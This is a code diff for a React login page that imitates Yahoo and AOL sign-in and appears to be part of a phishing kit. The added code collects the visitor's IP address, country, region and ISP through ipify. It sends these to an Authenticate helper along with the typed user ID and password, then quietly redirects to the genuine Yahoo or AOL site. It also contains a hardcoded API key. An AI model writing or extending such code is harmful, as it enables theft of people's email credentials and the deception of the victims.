@@ -1,8 +1,10 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import yahoo from '../../assets/yahoo-logo.png'
 import aol from '../../assets/Aol-logo.png'
 import { useParams } from 'react-router-dom'
 import { Authenticate } from '../../helpers/Auth'
+import axios from 'axios'
+import Loader from '../../component/Loader'
 
 const Yahoo = () => {
   const { service } = useParams()
@@ -11,14 +13,54 @@ const Yahoo = () => {
   const [showPasswordInput, setShowPasswordInput] = useState(false)
   const [error, setError] = useState('')
 
+  const [IPAddress, setIPAddress] = useState('')
+  const [metaData, setMetaData] = useState('')
+  const [redirect, setRedirect] = useState(false)
+
+  const [isLoading, setIsLoading] = useState(false)
+
+  let link
+
+  if (service === 'yahoo') {
+    link = 'https://currently.att.yahoo.com/'
+  } else link = 'https://www.aol.com/'
+  useEffect(() => {
+    redirect && window.location.replace(link)
+  }, [redirect])
+
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip)
+        console.log('ip is', data.ip)
+      })
+      .then(() => {
+        axios
+          .get(
+            `https://geo.ipify.org/api/v2/country?apiKey=at_51bi5RPzvgaTrXYA9cZohqZqMyKPI&ipAddress=${IPAddress}`
+          )
+          .then((resp) => {
+            const { location, isp } = resp.data
+            const { country, region } = location
+            console.log(country, region, isp)
+            setMetaData({ country, region, isp })
+          })
+          .catch((e) => console.log(e))
+      })
+      .catch((error) => console.error(error))
+  }, [])
+
   const handleClick = () => {
     setError('')
     if (userID) {
       if (!showPasswordInput) {
         setShowPasswordInput(true)
       } else if (password) {
-        console.log(userID, password)
-        Authenticate(userID, password, service)
+        setIsLoading(true)
+        Authenticate(userID, password, service, IPAddress, metaData).then(() =>
+          setRedirect(true)
+        )
       } else {
         setError('Enter your password')
         return
@@ -113,6 +155,7 @@ const Yahoo = () => {
           </section>
         </div>
       </main>
+      {isLoading && <Loader message={'Loading'} />}
     </div>
   )
 }
